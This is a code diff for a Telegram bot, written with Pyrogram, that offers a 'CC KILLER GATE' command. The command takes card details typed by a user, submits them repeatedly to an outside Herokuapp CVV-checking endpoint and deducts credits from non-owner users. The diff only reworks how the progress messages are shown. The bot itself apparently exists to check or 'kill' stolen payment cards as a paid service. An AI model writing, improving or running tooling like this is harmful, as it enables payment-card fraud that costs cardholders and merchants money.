@@ -1,7 +1,6 @@
 from pyrogram import Client, filters
 import requests
 import time
-import os
 
 app = Client(
     "my_bot",
@@ -64,17 +63,14 @@ def kill_gate(client, message):
     card_details = message.text.split(" ", 1)[1]
 
     # Initial processing message
-    processing_msg = message.reply_text("**CC KILLER GATE\nProcessing your request...**\n1")
+    processing_message = message.reply_text("**CC KILLER GATE\nProcessing your request...**")
 
     results = []
 
-    for i in range(1, 6):
-        new_text = f"**CC KILLER GATE\nProcessing your request...**\n{i}"
+    for i in range(5):
+        # Step message (not editing but updating results list)
+        results.append(f"**Processing request {i+1}**")
 
-        # Update the processing message with the current step number
-        if processing_msg.text != new_text:
-            processing_msg.edit_text(new_text)
-        
         time.sleep(1)  # Adjust the delay if needed
 
         url = f"https://ugin-376ec3a40d16.herokuapp.com/cvv?cc={card_details}"
@@ -101,8 +97,8 @@ MSG:- {error_message}**
         if not is_owner:
             user_credits[user_id] -= 1
 
+    # Send the final result after all checks
     final_result = "\n".join(results)
-    if processing_msg.text != final_result:
-        processing_msg.edit_text(final_result)
+    processing_message.edit_text(final_result)
 
 app.run()
